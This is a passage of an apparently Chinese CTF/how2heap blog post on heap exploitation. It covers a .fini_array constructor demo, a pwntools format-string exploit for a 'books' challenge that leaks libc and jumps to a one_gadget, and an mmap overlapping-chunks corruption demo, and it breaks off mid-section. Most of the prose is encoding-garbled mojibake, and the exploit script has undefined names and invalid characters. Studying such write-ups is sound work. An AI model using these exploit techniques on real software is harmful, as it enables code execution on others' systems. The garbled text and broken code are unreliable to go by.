å‡½æ•°æŒ‡é’ˆã€‚</p><p>å¯¹äºå¤§å¤šæ•°ç—…æ¯’æˆ–è€…æ¶æ„è½¯ä»¶ä½œè€…æ¥è¯´ï¼Œ .init_array å‡½æ•°æŒ‡é’ˆæ˜¯æœ€å¸¸è¢«æ”»å‡»çš„ç›®æ ‡ï¼Œå› ä¸ºå®ƒé€šå¸¸å¯ä»¥ä½¿å¾—å¯„ç”Ÿä»£ç åœ¨ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†æ‰§è¡Œä¹‹å‰å°±èƒ½å¤Ÿå…ˆè¿è¡Œã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¦‚ä¸‹ä»£ç è‡ªå·±å®éªŒä¸€ä¸‹ .ini_array å’Œ .fini_array çš„æŒ‡é’ˆå±æ€§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((constructor))</span>;<br><span class="hljs-comment">//constructoræ„ä¸ºæ„é€ å‡½æ•°å£°æ˜ï¼Œæ‰€æœ‰æ„é€ å‡½æ•°éƒ½ä¼šåœ¨mainå‡½æ•°ä¹‹å‰æ‰§è¡Œ</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((destructor))</span>;<br><span class="hljs-comment">//destructoræ„ä¸ºææ„å‡½æ•°ï¼Œæ‰€æœ‰ææ„å‡½æ•°éƒ½ä¼šåœ¨mainå‡½æ•°ä¹‹åè¿è¡Œ</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start == %p\n&quot;</span>, start);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stop == %p\n&quot;</span>, stop);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;goodbye world!\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰§è¡Œè¿™ä¸ªç¨‹åºï¼Œå¹¶æŸ¥çœ‹å…¶ .init_array å’Œ .fini_array çš„åœ°å€</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_1.png"></p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_3.png"></p><p>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ .init_array å’Œ .fini_array åœ°å€å¤„å­˜å‚¨çš„æŒ‡é’ˆï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_2.png"></p><p>.init_array å­˜çš„ <code>0x400540</code> æ˜¯ frame_dummy å‡½æ•°åœ°å€ï¼ˆå¯ä»¥åœ¨ ida é‡Œé¢æŸ¥çœ‹ï¼‰ï¼Œ<code>0x4005a4</code> æ˜¯æˆ‘è‡ªå·±å®šä¹‰çš„ start å‡½æ•°çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ main å‡½æ•°å¼€å§‹ä¹‹å‰ä¼šå…ˆæ‰§è¡Œ frame_dummy å‡½æ•°å’Œ start å‡½æ•°ã€‚</p><p>.fini_array å­˜çš„ <code>0x400520</code> æ˜¯ do_global_dtors_aux å‡½æ•°åœ°å€ï¼Œ<code>0x4005b5</code> æ˜¯è‡ªå·±å®šä¹‰çš„ stop å‡½æ•°çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ main å‡½æ•°ç»“æŸä¹‹åä¼šæ‰§è¡Œ do_global_dtors_aux å‡½æ•°å’Œ stop å‡½æ•°ã€‚</p><p>å»é™¤æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„å±æ€§ï¼Œæ­¤æ—¶ .ini_array å’Œ .fini_array éƒ½åªæœ‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¯¹åº”çš„ .ini_array æ˜¯ frame_dummy å‡½æ•°åœ°å€ï¼Œfini_arrayæ˜¯ __do_global_dtors_aux å‡½æ•°åœ°å€ã€‚</p><blockquote><p>çŸ¥è¯†ç‚¹ç»“æŸï¼</p></blockquote><hr><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å°† <code>.fini_array</code> åœ°å€å¤„çš„å‡½æ•°ä¿®æ”¹æˆ main å‡½æ•°çš„åœ°å€ï¼Œä½¿ç¨‹åºé‡æ–°å›åˆ° main å‡½æ•°ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³„æ¼ libc åœ°å€ï¼Œå†è¿›è¡Œ shellcode çš„æ„é€ è¿™æ ·å°±æ˜¯æ€»å…±åˆ©ç”¨ä¸‰æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ ida é‡Œé¢çœ‹åˆ° <code>.fini_array</code>  çš„åœ°å€æ˜¯ 0x6011B8ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_fini.png"></p><p>æ–°çš„é—®é¢˜æ¥äº†ï¼Œæ€ä¹ˆæŠŠ  <code>.fini_array</code>  è¾“å…¥è¿›æ ˆå¹¶ç¡®å®šå®ƒä¸ printf çš„åç§»ï¼ŸåŒä¸€ä¸ªå‡½æ•°çš„æ ˆç©ºé—´æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬åªéœ€è¦ç¡®å®šåç§»ï¼Œåªéœ€è¦åˆ©ç”¨å‰é¢çš„ 0x80 çš„ç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>.fini_arry</code> è¾“å…¥åˆ° s é‡Œç„¶åé€šè¿‡è°ƒè¯•ç¡®å®šåç§»ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/printf_padding.png"></p><p>æ–­ç‚¹æ‰“åœ¨ <code>printf(dest)</code> å¤„ï¼Œå¯ä»¥å¾—å‡ºæˆ‘ä»¬è¾“å…¥çš„ s åœ¨æ ˆä¸Šçš„åç§»æ˜¯ 12ã€‚</p><p>é™¤äº† fini çš„åç§»ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ç¡®å®š libc åŸºå€çš„åç§»ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_padding.png"></p><p>è¿™ä¸ªæ ˆåœ°å€å§‹ç»ˆæŒ‡å‘æ¯”è‡ªå·±ä½ <code>0x10</code> å­—èŠ‚çš„æ ˆåœ°å€ï¼Œè€Œä¸”æŒ‡å‘çš„æ ˆåœ°å€å’Œè¿”å›åœ°å€ä¹Ÿæœ‰å›ºå®šçš„ <code>0x28</code> çš„åç§»ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼è¿™ä¸ªæ ˆåœ°å€ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼š</p><p>æˆ‘ä»¬åœ¨å¡«å……æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œä¹Ÿéœ€è¦è€ƒè™‘ submitt å‡½æ•°çš„åŠŸèƒ½ã€‚æˆ‘ä»¬ç°åœ¨è¦†ç›–ç”¨ <em>v7</em> è¦†ç›–äº† <em>dest</em> éƒ¨åˆ†ï¼Œæ‰€ä»¥è¾“å‡ºçš„å­—ç¬¦ä¸²å°†æ˜¯ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_dest.png"></p><p>ç”±ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„éƒ¨åˆ†æ˜¯ chunk1 çš„å†…å®¹ï¼Œæˆ‘ä»¬æƒ³è¦æ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²éƒ¨åˆ†åœ¨ <em>dest</em> æŒ‡é’ˆå¤„ï¼Œå¯ä»¥æ§åˆ¶ chunk1 çš„å†…å®¹é•¿åº¦ï¼Œè®©å…¶ç¬¬äºŒæ¬¡è¢«å†™å…¥ <em>v5</em> æ—¶åˆšå¥½é‡å åœ¨ <em>dest</em> çš„ä½ç½®ã€‚</p><p>ä¹Ÿå°±æ˜¯ï¼š</p><p>size(<code>Order 1:</code> + <code>chunk1</code> + <code>&#39;\n&#39;</code> + <code>Order 2:</code> + <code>Order 1:</code>) &#x3D; 0x90</p><p>size(<code>chunk1</code>) &#x3D; 0x90 - 28 &#x3D; 0x74</p><p>æ‰€ä»¥æˆ‘ä»¬æ„é€  <code>chunk1</code> ä¸­çš„å†…å®¹çš„æ—¶å€™åªè¦ä½¿å…¶ä¸­é 0 å­—ç¬¦ä¸²çš„ä¸ªæ•°è¾¾åˆ° <code>0x74</code> å°±è¡Œäº†ã€‚</p><p>ç»¼ä¸Šï¼</p><blockquote><p>è¿™é“é¢˜å¯¹æˆ‘æ¥è¯´å¥½éš¾å•ŠğŸ˜¢å¯¹ç€åˆ«äººçš„ wp ç£•äº†ä¸¤å¤©æ‰å—‘æ˜ç™½ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„éƒ¨åˆ†è¿˜æ˜¯æœ‰äº›ç”Ÿç–äº†</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./books&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b main&quot;)</span><br>elf=ELF(<span class="hljs-string">&quot;./books&quot;</span>)<br>free_got=f.got[<span class="hljs-string">&quot;free&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">num,msg</span>):<br>    p.sendline(num)<br>    p.sendline(msg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">num</span>):<br>    p.sendline(num)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br><br>fini_addr=<span class="hljs-number">0x6011b8</span><br>start = <span class="hljs-number">0x400780</span><br>one = [<span class="hljs-number">0x45206</span>,<span class="hljs-number">0x4525a</span>,<span class="hljs-number">0xcc673</span>,<span class="hljs-number">0xcc748</span>,<span class="hljs-number">0xefa00</span>,<span class="hljs-number">0xf0897</span>,<span class="hljs-number">0xf5e40</span>,<span class="hljs-number">0xef9f4</span>] <br><br>delete(<span class="hljs-number">2</span>)<br><br>payload = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(start &amp; <span class="hljs-number">0xffff</span>),<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">b&#x27;c%13$hn&#x27;</span> <span class="hljs-comment">#ä¿®æ”¹finiçš„å†…å®¹</span><br>payload=payload+<span class="hljs-string">b&quot;function:%31$p stack:%33$p&quot;</span>    <span class="hljs-comment"># æ³„éœ²æ ˆé¡¶åœ°å€å’Œå‡½æ•°åœ°å€</span><br>payload=payload+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x74</span>-<span class="hljs-built_in">len</span>(payload))<br>payload=payload+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x88</span>-<span class="hljs-built_in">len</span>(payload))+p64(<span class="hljs-number">0x151</span>)<br><br>edit(<span class="hljs-number">1</span>ï¼Œpayload)<br>submit(p64(fini_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;stack:&quot;</span>)<br>stack_addr=p.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>)[:-<span class="hljs-number">1</span>]<br>stack_addr=<span class="hljs-built_in">int</span>(stack_addr,<span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;function:&quot;</span>)<br>libc_start_main=p.recvuntil(<span class="hljs-string">b&quot; &quot;</span>)[:-<span class="hljs-number">1</span>]<br>libc_start_main=<span class="hljs-built_in">int</span>(libc_start_main,<span class="hljs-number">16</span>) <span class="hljs-comment"># å°†0xå½¢å¼çš„å­—ç¬¦ä¸²è½¬åŒ–æ•°å­—</span><br><br>libc_start_main=libc_start_main-<span class="hljs-number">240</span><br><br>libc_addr=libc_start_main-<span class="hljs-number">0x20750</span><br>stack_addr=stack_addr-<span class="hljs-number">0x1b0</span>-<span class="hljs-number">0x110</span> +<span class="hljs-number">208</span><br>onegadget_addr=libc_addr+<span class="hljs-number">0x45226</span><br><br><br>one_gadget = libc_base + one[<span class="hljs-number">0</span>]<br>one1 = u16(p64(one_gadget)[:<span class="hljs-number">2</span>])-<span class="hljs-number">22</span>  <span class="hljs-comment">#æœ€å2å­—èŠ‚ +åç§»</span><br>one2 = u8(p64(one_gadget)[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>]) -<span class="hljs-number">6</span> <span class="hljs-comment">#æœ€åç¬¬3å­—èŠ‚+åç§»</span><br><br>delete2()<br><span class="hljs-built_in">print</span>(one1)<br><span class="hljs-built_in">print</span>(one2)<br>payload=<span class="hljs-string">b&quot;%&quot;</span>+one1+<span class="hljs-string">b&quot;c%13$hhn&quot;</span>+<span class="hljs-string">b&quot;%&quot;</span>+one2+<span class="hljs-string">b&quot;c%14$hn&quot;</span><br><br>payload=payload+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x90</span>-<span class="hljs-number">28</span>-<span class="hljs-built_in">len</span>(payload))<br>payload=payload+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x88</span>-<span class="hljs-built_in">len</span>(payload))+p64(<span class="hljs-number">0x151</span>)<br><span class="hljs-comment"># Order 1: å†…å®¹\nOrder 2: Order 1: å†…å®¹\nOrder 2: \n</span><br>edit(<span class="hljs-number">1</span>ï¼Œpayload)<br><br>submit(<span class="hljs-string">b&#x27;5&#x27;</span>+<span class="hljs-number">7</span>*p8(<span class="hljs-number">0x0</span>)+p64(stack_addr+<span class="hljs-number">2</span>)+p64(stack_addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h1><blockquote><p>åˆ°è¿™é‡Œé‚£ä¸ªç‹¼ç»„å®‰å…¨å°±ç»“æŸäº†ï¼Œæˆ‘åˆå®åœ¨çœ‹ä¸æ‡‚è‹±æ–‡åŸç‰ˆæ‰€ä»¥æ‰¾äº†ä¸€ä¸ªæ–°çš„ï¼Œè¿™ä½å¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†ï¼š<a href="https://bbs.kanxue.com/thread-272416.htm#msg_header_h2_15">åŸåˆ›|how2heapæ·±å…¥æµ…å‡ºå­¦ä¹ å †åˆ©ç”¨-Pwn</a></p></blockquote><p><strong>åŸç†ï¼š</strong>é€šè¿‡overlapè·å–ä¸€å—å¯ä»¥ä¿®æ”¹çš„å†…å­˜ï¼Œä»è€Œå°†è¿™é‡Œé¢çš„åœ°å€ä¿®æ”¹ä¸ºç›®æ ‡åœ°å€ã€‚</p><p><strong>çŸ¥è¯†ç‚¹âœ¨ï¼š</strong></p><ul><li>ç”³è¯·è¶…è¿‡ 0x100000 è¿™ä¹ˆå¤§çš„å†…å­˜æ—¶ï¼Œç³»ç»Ÿä¸å†ä» heap æ®µåˆ†å‰²ï¼Œè€Œæ˜¯é€šè¿‡ <code>sysmalloc</code> å‡½æ•°ä» mmap æ®µåˆ†é…ã€‚mmap æ˜ å°„æ®µåœ¨ 64 ä½ç³»ç»Ÿä¸­è‡ªé«˜åœ°å€å‘ä½åœ°å€å¢é•¿ï¼Œmmap chunk åˆ†é…èµ·å§‹å€¼æ˜¯<code>mp_.mmap_threshold</code> ï¼Œéšç€ä¸Šä¸€æ¬¡ free mmap chunk åŠ¨æ€å˜åŒ–ï¼Œå–æœ€å¤§å€¼ï¼Œå°½é‡å‡å°‘ mmap æ•°é‡ã€‚</li><li>mmap chunk çš„ <code>prev_size</code> ä½ä¸å†æ˜¯ä¸‹ä¸€ä¸ª chunk çš„å¤§å°ï¼Œè€Œæ˜¯æœ¬ chunk ä¸­æ²¡æœ‰ä½¿ç”¨çš„éƒ¨åˆ†çš„å¤§å°ã€‚å› ä¸ºmmap åˆ†é…çš„ chunk éƒ½éœ€è¦æŒ‰é¡µå¯¹é½ï¼Œé€ æˆäº†è®¸å¤šä¸å¿…è¦çš„ç©ºé—´æµªè´¹ã€‚mmap chunks çš„ <em>fd</em>ã€<em>bk</em> æŒ‡é’ˆä¹Ÿæ²¡æœ‰ä½¿ç”¨ï¼Œå› ä¸ºä»–ä»¬ä¸ä¼šè¿›å…¥ bin çš„é“¾è¡¨ä¸­ï¼Œè€Œæ˜¯ç›´æ¥å½’è¿˜ç»™ç³»ç»Ÿã€‚</li><li>åœ¨ mmap æ˜ å°„æ®µä¸­åŒæ ·ä¹ŸåŒ…å«äº† libc çš„æ˜ å°„</li></ul><p><strong>GDB è°ƒè¯•</strong></p><blockquote><p>ä»£ç è¶…ç²¾ç®€ç‰ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br> <span class="hljs-type">long</span> *m1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br> <span class="hljs-type">long</span> *m2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br> <span class="hljs-type">long</span> *m3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br> <span class="hljs-type">long</span> size =  m3[<span class="hljs-number">-1</span>]<span class="hljs-number">-2</span> + m2[<span class="hljs-number">-1</span>]<span class="hljs-number">-2</span> + <span class="hljs-number">2</span>;<br> m3[<span class="hljs-number">-1</span>] = size;<br> <span class="hljs-built_in">free</span>(m3);<br> <span class="hljs-type">long</span> *m4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300000</span>);<br> m4[m2-m4] = <span class="hljs-number">0x1122334455667788</span>;<br> assert(m2[<span class="hljs-number">0</span>] == <span class="hljs-number">0x1122334455667788</span>);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>æˆ‘ä»¬é¦–å…ˆç”³è¯·ä¸‰ä¸ª 0x100000 çš„å¤§å †å—</p><p>åœ¨ç”³è¯·å †å—å‰ï¼Œvmmap æŸ¥çœ‹å†…å­˜æƒ…å†µ</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap.png"></p><p>ç¬¬ä¸€æ¬¡ malloc åï¼Œå †æ®µè¢«åˆå§‹åŒ–ï¼Œm1 è¢«æ˜ å°„åˆ° mmap æ®µã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-m1.png"></p><p>æ­¤æ—¶åˆ†é…çš„ m1 åœ¨ ld çš„ä¸Šæ–¹ï¼Œä¹Ÿå°±æ˜¯åœ¨æ¯” ld æ›´é«˜åœ°å€çš„åœ°æ–¹ã€‚</p><p>ç¬¬äºŒæ¬¡ malloc åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸¤æ¬¡çš„å †å—ä½ç½®ä¸è¿ç»­ï¼Œä¸”chunk_m2 çš„ä½ç½®åœ¨ libc ä¹‹ä¸Šï¼Œä¹Ÿå°±æ˜¯ chunk_m2 åœ°å€æ¯” libc çš„åœ°å€ä½ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-m2.png"></p><p>ç»§ç»­ç”³è¯· 0x100000 å¤§å°çš„ chunk_m3ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-m3.png"></p><p>æ¥ä¸‹æ¥çš„ overlapping æ˜¯å¸¸è§„çš„æ–¹æ³•ï¼Œæ›´æ”¹ <em>m3</em> çš„ size æ®µä¸º <em>m2</em> å’Œ <em>m3</em> çš„å¤§å°ä¹‹å’Œã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-m2-size.png"></p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-m2-size2.png"></p><p>è¿™æ ·æˆ‘ä»¬ free æ‰ <em>m3</em> ï¼Œå°±ä¼šæŠŠ <em>m2</em>ã€<em>m3</em> çš„æ•´ä½“å†…å­˜éƒ¨åˆ†å½’è¿˜ç»™ç³»ç»Ÿï¼Œæˆ‘ä»¬æ­¤æ—¶æŸ¥çœ‹ <code>mp_.mmap_threshold</code> å°±å˜æˆäº†æˆ‘ä»¬ä¼ªé€ çš„ chunk <em>m2</em> çš„å¤§å°</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap_mp_mmap_threshold.png"></p><p>æˆ‘ä»¬å†æ­¤ç”³è¯·ä¸€ä¸ªå †å—ï¼Œéœ€è¦æ³¨æ„ï¼Œè¿™æ—¶ç”³è¯·çš„å †å—å¤§å°éœ€è¦å¤§äº 0x202000 ï¼Œä¸ç„¶ä¼šåˆ†é…åˆ° heap å—å»ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-m4.png"></p><p>åœ¨ mmap_base ä¸‹æ–¹ï¼ˆå®é™…ä¸Šå°±æ˜¯ libc ä¸‹æ–¹ï¼‰ã€‚åˆ†é…æ˜¯åœ¨å½¼æ­¤ä¸‹æ–¹è¿ç»­è¿›è¡Œçš„ã€‚æ‰€ä»¥ <em>m4</em> çš„åœ°å€ä¸ºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x301000</span>-<span class="hljs-number">0</span>x202000=<span class="hljs-number">0</span>xFF000<br><span class="hljs-attribute">0x7ffff77df010</span>-<span class="hljs-number">0</span>xFF000=<span class="hljs-number">0</span>x7ffff76e0010<br></code></pre></td></tr></table></figure><p>å†…å­˜ä¸­çš„å¸ƒå±€ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/mmap-heap-ptr.png"></p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ <em>m4</em> æ¥è¦†å†™ <em>m2</em> ä¸Šçš„å†…å­˜äº†</p><p>è¿™ä¸ªæŠ€æœ¯å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›– mmap æ˜ å°„æ®µçš„å†…å­˜ï¼Œè¿™å—å†…å­˜ä¸­åŒæ—¶ä¹Ÿä¿å­˜ç€ libc.so æ–‡ä»¶çš„æ˜ å°„ã€‚free æ‰è¿™å— overlap åçš„å†…å­˜çš„åŒæ—¶ä¹Ÿä¼šæ¸…ç©ºè¿™å—å†…å­˜çš„å†…å®¹ï¼Œé‚£ä¹ˆå°±å¯ä»¥å–æ¶ˆ libc æ˜ å°„åé€šè¿‡é‡å†™ç¬¦å·è¡¨ï¼ˆsymbol tableï¼‰æ¥åŠ«æŒå…¶ä»–çš„å‡½æ•°åœ°å€åˆ°æˆ‘ä»¬æƒ³è¦çš„systemå‡½æ•°åœ°å€ã€‚</p><h1 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h1><p><strong>åŸç†ï¼š</strong> ä¿®æ”¹ tcache bin ä¸­ chunk çš„ next 